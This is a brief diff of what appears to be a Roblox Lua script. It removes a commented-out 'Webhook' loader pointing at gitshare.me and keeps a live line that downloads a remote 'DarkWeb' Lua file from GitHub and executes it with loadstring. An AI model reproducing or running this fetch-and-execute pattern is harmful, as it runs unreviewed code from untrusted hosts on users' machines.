@@ -126,9 +126,6 @@ spawn(function()
     })
 end)
 -- print("--------------------------------------------------------------------------");
--- print("-- [[ Webhook ]] --");
--- (loadstring(game:HttpGet("https://gitshare.me/backend/api/files/677ec71a-082b-4b8c-a1e8-f590f2ab286a/download")))();
--- print("--------------------------------------------------------------------------");
 local Update = (loadstring(Game:HttpGet("https://raw.githubusercontent.com/ffgringoxp123-code/Blonbah/refs/heads/main/DarkWeb.Blue_GreenText.lua")))();
 if Update:LoadAnimation() then
 	Update:StartLoad();
